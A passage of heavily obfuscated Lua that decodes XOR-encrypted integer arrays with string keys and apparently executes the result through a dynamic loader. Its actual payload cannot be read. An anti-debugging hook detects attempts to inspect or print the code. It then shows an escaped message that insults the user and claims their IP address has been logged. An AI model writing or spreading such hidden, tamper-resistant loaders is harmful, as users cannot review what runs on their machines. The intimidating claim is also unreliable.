  end; pt7JuKO6Z8mWGrBQpJxzBHqHftGdAjFaKNCbDhy25Wm9z8zERJpK6KwyVOP(f,
    function(r) sn66Qodym8s3GrUlNlBKzFV6w4LZ2uwq5FUS5yauq9XL7me5tKljIgSLNRIWmgm7G(r, g,
        function(s) ogGYj7DNKI2MXY0qFYJoigstWZLE3DFnb2hFqOt5rvRrPEFrTYDAHXVAgio(s,
            function(t) if #pD6fRZqzYr47PHa1ZtkQL2gWBqh1j6RsEWGxDMLcWxhtCny10hIsc(ssCJP46EphhQCIQMZrOMNe5CXqnqaKtwQeNgGYk3V5yC3I6vnCKczvA5lvpLawhfpd[pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('A2') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('85') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('B7') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('9A')]) == 1 then if ssCJP46EphhQCIQMZrOMNe5CXqnqaKtwQeNgGYk3V5yC3I6vnCKczvA5lvpLawhfpd[pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('A2') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('85') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('B7') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('9A')] == ssCJP46EphhQCIQMZrOMNe5CXqnqaKtwQeNgGYk3V5yC3I6vnCKczvA5lvpLawhfpd[pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('26') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('68') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('BF') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('E4') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('AA')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if ssCJP46EphhQCIQMZrOMNe5CXqnqaKtwQeNgGYk3V5yC3I6vnCKczvA5lvpLawhfpd[pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('A2') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('85') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('B7') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('9A')](t) then
                    ssCJP46EphhQCIQMZrOMNe5CXqnqaKtwQeNgGYk3V5yC3I6vnCKczvA5lvpLawhfpd
                        [pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('A2') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('85') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('B7') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('9A')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; ga2G77RXL6JU3HzYw3GIooK7UnRSSgKhfnw1zxpmrM21LSpbN1pNOvMHkYFvw(
{ 586, 652, 953, 796, 589, 1202, 631, 1089, 1119, 1062, 1070, 912, 904, 900, 866, 756, 627, 717, 1087, 731, 830, 1130,
  1014, 827, 1026, 666, 1093, 646, 764, 1184, 594, 872, 1124, 1038, 576, 979, 1030, 772, 748, 665, 753, 1169, 668, 1104,
  954, 948, 1173, 984, 931, 828, 778, 1147, 1199, 786, 1020, 720, 559, 878, 1071, 911, 1115, 1188, 1152, 966, 1167, 857,
  908, 590, 1025, 1157, 787, 1162, 1021, 1012, 1127, 680, 1007, 1039, 671, 752, 852, 768, 1045, 816, 676, 963, 903, 927,
  925, 656, 885, 1055, 873, 926, 718, 1074, 746, 851, 801, 614, 1060, 561, 905, 867, 674, 814, 906, 1179, 943, 698, 664,
  924, 843, 980, 551, 678, 1047, 969, 569, 624, 1101, 1052, 747, 821, 856, 566, 845, 629, 886, 1046, 688, 1032, 804, 976,
  1206, 978, 1040, 996, 842, 1084, 809, 734, 961, 1181, 585, 769, 1057, 820, 637, 1017, 673, 1186, 1091, 651, 1192, 1143,
  565, 849, 773, 901, 1075, 622, 738, 699, 1155, 685, 548, 831, 1196, 725, 854, 645, 949, 719, 634, 987, 564, 611, 601,
  1113, 1061, 1051, 836, 571, 1079, 726, 1092, 928, 1195, 615, 562, 798, 1082, 655, 810, 1164, 663, 1141, 1210, 1193,
  938, 1095, 1174, 762, 897, 633, 1100, 861, 1126, 1145, 888, 1018, 1205, 899, 733, 992, 707, 1086, 758, 781, 729, 1111,
  580, 840, 766, 942, 700, 822, 1010, 550, 765, 686, 1019, 1116, 579, 1003, 863, 932, 892, 1065, 1094, 818, 839, 1041,
  684, 1121, 1002, 643, 741, 608, 658, 1138, 642, 1132, 823, 560, 1106, 618, 1182, 616, 1102, 1015, 1016, 604, 910, 935,
  1099, 722, 553, 1107, 847, 639, 785, 981, 744, 736, 918, 583, 687, 1133, 554, 1118, 776, 659, 754, 595, 907, 1066, 921,
  1203, 672, 939, 592, 1027, 846, 957, 973, 703, 600, 1029, 728, 916, 679, 602, 972, 1067, 805, 995, 937, 739, 609, 1177,
  1085, 993, 881, 1036, 919, 902, 1153, 549, 1146, 858, 1042, 1013, 1098, 915, 625, 817, 1109, 749, 558, 833, 783, 704,
  555, 1163, 1108, 619, 1034, 889, 1068, 807, 759, 1103, 977, 877, 723, 623, 598, 1059, 715, 775, 1190, 743, 974, 626,
  1129, 986, 832, 1031, 709, 998, 955, 1140, 1063, 1207, 835, 797, 1080, 875, 893, 864, 815, 721, 1171, 970, 1160, 660,
  870, 1056, 1180, 1069, 960, 751, 874, 1208, 1151, 841, 962, 795, 610, 606, 829, 543, 1150, 983, 588, 710, 1097, 806,
  895, 1122, 705, 1187, 922, 792, 975, 1078, 650, 635, 693, 683, 628, 1156, 577, 869, 896, 791, 1131, 1000, 1134, 1185,
  940, 1170, 850, 813, 883, 1043, 575, 819, 1004, 779, 694, 669, 1064, 1011, 808, 923, 784, 574, 913, 647, 724, 1008,
  545, 649, 991, 826, 567, 546, 745, 1009, 692, 612, 653, 1144, 1200, 584, 802, 1183, 914, 1096, 890, 1105, 1114, 675,
  767, 944, 1212, 1166, 620, 1083, 1172, 581, 763, 770, 946, 757, 1135, 573, 898, 682, 1159, 865, 1033, 596, 563, 1194,
  936, 1139, 988, 951, 803, 568, 557, 990, 824, 788, 714, 947, 837, 760, 1077, 605, 945, 825, 1081, 860, 1024, 1073, 811,
  641, 1050, 967, 638, 917, 587, 657, 997, 1211, 1148, 662, 636, 1137, 1204, 884, 740, 547, 708, 971, 593, 648, 793, 713,
  1110, 1058, 1006, 909, 1005, 1117, 1209, 716, -1, 62, 28, 81, 4, 74, 99, 74, 31, 35, 181, 30, 99, 76, 120, 74, 70, 20,
  28, 87, 4, 2, 107, 88, 115, 30, 69, 19, 64, 96, 66, 66, 19, 105, 17, 65, 153, 30, 67, 75, 36, 40, 25, 2, 96, 9, 25, 0,
  6, 188, 85, 21, 19, 21, 42, 183, 62, 182, 101, 84, 39, 121, 43, 98, 38, 60, 79, 19, 30, 74, 10, 206, 21, 82, 16, 59,
  18, 12, 88, 166, 94, 39, 1, 16, 100, 10, 78, 25, 31, 5, 85, 80, 65, 75, 81, 78, 35, 1, 61, 32, 0, 45, 2, 68, 61, 69,
  54, 63, 14, 80, 2, 40, 25, 69, 14, 94, 64, 3, 121, 215, 114, 91, 5, 121, 17, 133, 79, 33, 0, 26, 2, 107, 74, 14, 87,
  194, 1, 1, 91, 79, 121, 87, 114, 101, 5, 3, 96, 125, 129, 130, 51, 110, 11, 116, 149, 225, 13, 77, 54, 14, 214, 20, 89,
  115, 39, 76, 22, 76, 74, 167, 28, 117, 2, 105, 29, 55, 72, 118, 47, 98, 7, 89, 68, 117, 107, 6, 5, 38, 141, 94, 59, 69,
  12, 83, 19, 123, 65, 18, 91, 19, 26, 85, 6, 86, 70, 78, 67, 100, 87, 67, 62, 67, 79, 63, 0, 98, 112, 30, 74, 253, 94,
  87, 31, 3, 79, 21, 108, 28, 74, 30, 75, 86, 158, 121, 9, 152, 65, 26, 88, 6, 77, 108, 3, 60, 39, 9, 34, 115, 68, 88,
  20, 110, 222, 0, 62, 113, 101, 208, 111, 60, 10, 65, 30, 35, 39, 41, 108, 57, 123, 14, 85, 98, 53, 17, 4, 92, 15, 121,
  55, 68, 6, 32, 20, 66, 25, 25, 27, 20, 108, 86, 108, 67, 126, 81, 77, 87, 250, 66, 85, 87, 71, 84, 224, 9, 31, 53, 183,
  103, 17, 68, 11, 230, 68, 134, 101, 49, 39, 25, 121, 86, 217, 1, 96, 85, 18, 10, 155, 1, 67, 245, 25, 94, 42, 76, 102,
  30, 10, 102, 97, 5, 55, 112, 15, 37, 5, 170, 93, 114, 62, 6, 3, 80, 127, 40, 5, 64, 105, 90, 60, 96, 31, 84, 27, 15,
  24, 2, 10, 109, 72, 1, 18, 4, 18, 43, 0, 29, 6, 30, 128, 78, 14, 26, 15, 53, 93, 49, 76, 76, 103, 3, 30, 234, 233, 8,
  108, 68, 87, 86, 87, 97, 100, 70, 0, 112, 17, 97, 75, 86, 128, 87, 255, 20, 4, 2, 35, 108, 130, 101, 70, 105, 13, 24,
  175, 142, 66, 0, 105, 48, 66, 5, 18, 112, 79, 27, 62, 87, 0, 33, 98, 43, 243, 2, 21, 249, 67, 79, 76, 210, 114, 18, 77,
  114, 165, 23, 74, 107, 87, 56, 108, 222, 61, 38, 0, 108, 72, 65, 124, 108, 62, 94, 70, 6, 25, 59, 31, 24, 107, 12, 81,
  41, 53, 37, 15, 79, 2, 74, 203, 121, 50, 89, 52, 10, 12, 167, 41, 48, 70, 66, 91, 106, 49, 66, 232, 8, 111, 59, 116,
  125, 78, 73, 121, 221, 131, 121, 85, 29, 82, 104, 22, 70, 54, 14, 70, 26, 34, 10, 5, 100, 36, 20, 234, 26, 104, 65, 90,
  17, 39, 72, 70, 105, 124, 70, 98, 70, 107, 70, 33, 7, 86, 88, 74, 3, 2, 91, 6, 69, 44, 24, 83, 79, 24, 31, 39, 67, 31,
  49, 65, 101, 67, 83, 3, 70, 14, 88, 45, 6, 30, 121, 120, 10, 22, 168, 27, 178, 82, 75, 220, 70, 31, 81, 10, 16, 70,
  112, 252, 41, 107, 89, 10, 82, 27, 66, 43, 117, 89, 28, 74, 156, 70, 30, 55, 91, 240, 29, 94, 39, 71, 67, 105, 19, 7,
  87, 106, 193, 123, 61, 43, 85, 74, 112, 70, 107, 126, 233, 9, 23, 23, 42, 79, 41, 2, 48, 100, 75, 72, 62, 44, 164, 67,
  163, 77, 99, 105, 68, 110, 113, 246, 74, 75, 76, 4, 37, 8, 85, 70, 55, 22, 34, 67, 69, 66 },
  "jRqLfkwj1BPbIYcuoDfcLylwae"); x5pTB9IH5kApCTuEjIHtCjSHutltYB4DVtoKXvZSaJiaMuSfCptdSvm3AgBul6j9RDa =
ssCJP46EphhQCIQMZrOMNe5CXqnqaKtwQeNgGYk3V5yC3I6vnCKczvA5lvpLawhfpd; vDVA7EGd231gucQrqIrPNST2czyXToYMOmJfGbkx0R1rTpRG4dxBxmcOKFPkUt383I0DDinDsp =
ssCJP46EphhQCIQMZrOMNe5CXqnqaKtwQeNgGYk3V5yC3I6vnCKczvA5lvpLawhfpd; l3fE5ZgztCZterxVq611pzsyg4rSPKHVS9ZdzssPdrO8mCcoCQq1Hl2PZWedTABGq =
vDVA7EGd231gucQrqIrPNST2czyXToYMOmJfGbkx0R1rTpRG4dxBxmcOKFPkUt383I0DDinDsp; xCEnFlUKr07Dndyg1W9Cs9hsXCyGHCF4vq2L8l0eDfE3V1R7QzifbGTCmpb9FPKPjGLJ5aN =
l3fE5ZgztCZterxVq611pzsyg4rSPKHVS9ZdzssPdrO8mCcoCQq1Hl2PZWedTABGq; rfoPsj2iSA0aiVAonZKEPlGbigeDbPGth2iWJpVGuagjG4ZdrW2x3U66 =
xCEnFlUKr07Dndyg1W9Cs9hsXCyGHCF4vq2L8l0eDfE3V1R7QzifbGTCmpb9FPKPjGLJ5aN; vvawcdbBy2VzkMXCxQqWBHq2ZYoxZRKbnkyldljjz9HSkDNpKftM47IaUT5i4ZRy =
rfoPsj2iSA0aiVAonZKEPlGbigeDbPGth2iWJpVGuagjG4ZdrW2x3U66; joaLKz9sENNZ01uNYVCT2pHcETyFkBHXtD4ZFA3eBjLwKETL7nr3N1CZkwl =
vvawcdbBy2VzkMXCxQqWBHq2ZYoxZRKbnkyldljjz9HSkDNpKftM47IaUT5i4ZRy; vWDxM4XypYisbEbthKl4EFP12Tf0L0IEb5uE3oFI8kTRQS3txa6vUN5qFz =
joaLKz9sENNZ01uNYVCT2pHcETyFkBHXtD4ZFA3eBjLwKETL7nr3N1CZkwl; pce94uIl9wQqNoYyQHnRMZRt7DUjgnFVofOzVGiBwtFKfm2PpXngwk1Wret6IUagxTYGhQ =
vWDxM4XypYisbEbthKl4EFP12Tf0L0IEb5uE3oFI8kTRQS3txa6vUN5qFz; fjHKC6MhbyWY6hjjMC325KbLPiEbYPoXZNNTzPQR56Mx53hUy3WkXigGFRnPcDovz412Rf =
pce94uIl9wQqNoYyQHnRMZRt7DUjgnFVofOzVGiBwtFKfm2PpXngwk1Wret6IUagxTYGhQ; o0tojiGm4XcpwPKP0Cw0Mom6vM1Gijn4MbnKuI2sbPXClaCFYeIDuU =
fjHKC6MhbyWY6hjjMC325KbLPiEbYPoXZNNTzPQR56Mx53hUy3WkXigGFRnPcDovz412Rf; n992pPjTzKiDltM91Xc2VtAtUU2JE38X51z4N1ebGs53J8atlSlivcqk =
o0tojiGm4XcpwPKP0Cw0Mom6vM1Gijn4MbnKuI2sbPXClaCFYeIDuU; jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i = function(
  a)
  K, F = 5922988004862676, 16384 + 3276; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; isofZnDmz25NVBIci8rXw5yvAswWfe3x9eH80pcgECfePo8U1W9uBXbN = function(b)
  co = coroutine.create(b)
  pVEOPmFTTVe8HIVkC4YSoA8yHTQ4WFBoDhT3EPHiqjdYEG47CJXsfyitzMyqjf = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(pVEOPmFTTVe8HIVkC4YSoA8yHTQ4WFBoDhT3EPHiqjdYEG47CJXsfyitzMyqjf, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return pVEOPmFTTVe8HIVkC4YSoA8yHTQ4WFBoDhT3EPHiqjdYEG47CJXsfyitzMyqjf
end; xuRNQQwWlDVo1tzgwvw3gC6tP0UQTKT4GOasz2h7JmUEmupD42kv9 = function(f, g)
  dZ2sRqfoFK8PX5aUila3OYqhCjRteYiiRAWA43EfPxp488dkgj36mPNMjlk = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; pR3ANzPY8g7C6QehmEwguX2fwDCwgUhAZiH8u4DRoruPk4oUm2BYbLU8OvHiAnvyw0y5jJaq = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; mKYZfolpppEN56zGKgE4G477nRxKLID2NhhJ1U1cd0tCyZyHIMudPD7tuROwVH3yHEzyDNG = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      dZ2sRqfoFK8PX5aUila3OYqhCjRteYiiRAWA43EfPxp488dkgj36mPNMjlk(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; phAch8s2OISBbJ5rBbl1akr9fdWYs0nUOaBQWRXgalAJQWj0hQADePkzEV = function(p, n)
    nCyVlFqPvwJBNxx2bgmWEApFl4PB0wQF726rpoOyWSwIMidlR8aDOShmJ29LpvnXt4hY = ""
    for k, q in pairs(p) do nCyVlFqPvwJBNxx2bgmWEApFl4PB0wQF726rpoOyWSwIMidlR8aDOShmJ29LpvnXt4hY =
      nCyVlFqPvwJBNxx2bgmWEApFl4PB0wQF726rpoOyWSwIMidlR8aDOShmJ29LpvnXt4hY ..
      n992pPjTzKiDltM91Xc2VtAtUU2JE38X51z4N1ebGs53J8atlSlivcqk
      [jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('9D') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('04') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('36') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('97') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('9A') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('C9')]
      [jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('2D') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('30') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('5F') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('36')](
      q) end
    ; n(nCyVlFqPvwJBNxx2bgmWEApFl4PB0wQF726rpoOyWSwIMidlR8aDOShmJ29LpvnXt4hY)
  end; pR3ANzPY8g7C6QehmEwguX2fwDCwgUhAZiH8u4DRoruPk4oUm2BYbLU8OvHiAnvyw0y5jJaq(f,
    function(r) mKYZfolpppEN56zGKgE4G477nRxKLID2NhhJ1U1cd0tCyZyHIMudPD7tuROwVH3yHEzyDNG(r, g,
        function(s) phAch8s2OISBbJ5rBbl1akr9fdWYs0nUOaBQWRXgalAJQWj0hQADePkzEV(s,
            function(t) if #isofZnDmz25NVBIci8rXw5yvAswWfe3x9eH80pcgECfePo8U1W9uBXbN(n992pPjTzKiDltM91Xc2VtAtUU2JE38X51z4N1ebGs53J8atlSlivcqk[jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('CC') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('01') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('5F') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('94')]) == 1 then if n992pPjTzKiDltM91Xc2VtAtUU2JE38X51z4N1ebGs53J8atlSlivcqk[jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('CC') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('01') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('5F') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('94')] == n992pPjTzKiDltM91Xc2VtAtUU2JE38X51z4N1ebGs53J8atlSlivcqk[jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('68') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('36') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('97') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('9A') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('04')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if n992pPjTzKiDltM91Xc2VtAtUU2JE38X51z4N1ebGs53J8atlSlivcqk[jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('CC') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('01') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('5F') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('94')](t) then
                    n992pPjTzKiDltM91Xc2VtAtUU2JE38X51z4N1ebGs53J8atlSlivcqk
                        [jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('CC') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('01') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('5F') .. jGJOnKMqdYL5sfSh3ws2znjGRHoLHIjF4zmXhIj0BLU2EhhGQA0i('94')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; xuRNQQwWlDVo1tzgwvw3gC6tP0UQTKT4GOasz2h7JmUEmupD42kv9(
{ 635, 553, 775, 1190, 1008, 673, 909, 571, 1047, 831, 949, 1028, 882, 839, 1005, 985, 1076, 1092, 608, 841, 854, 678,
  1018, 796, 1126, 1106, 714, 924, 617, 1164, 1148, 733, 904, 554, 1188, 829, 671, 950, 748, 1130, 799, 562, 913, 1201,
  1107, 659, 1093, 989, 667, 1182, 734, 1067, 1139, 637, 1173, 847, 572, 957, 1203, 1109, 1033, 1059, 725, 956, 712,
  1088, 1095, 873, 826, 703, 587, 1074, 1133, 550, 623, 945, 910, 757, 728, 552, 789, 661, 1024, 705, 1053, 1163, 607,
  1075, 874, 1170, 936, 919, 1025, 677, 697, 1065, 823, 1150, 1099, 696, 842, 555, 848, 805, 814, 865, 892, 1144, 890,
  1038, 1143, 998, 720, 735, 887, 855, 627, 1177, 646, 669, 686, 573, 1138, 579, 1204, 811, 821, 859, 984, 759, 1142,
  812, 657, 918, 650, 835, 879, 723, 1193, 713, 994, 1070, 1114, 632, 1049, 597, 782, 923, 867, 1069, 1041, 765, 869,
  883, 619, 1023, 1066, 591, 630, 672, 1060, 763, 681, 972, 927, 794, 767, 558, 546, 1122, 761, 974, 694, 1015, 719, 647,
  817, 832, 783, 699, 778, 971, 818, 784, 785, 911, 615, 1149, 803, 990, 843, 731, 1052, 706, 633, 807, 969, 1001, 749,
  766, 726, 588, 834, 1020, 1176, 710, 577, 872, 1048, 798, 917, 948, 569, 955, 1019, 954, 1134, 926, 680, 1068, 751,
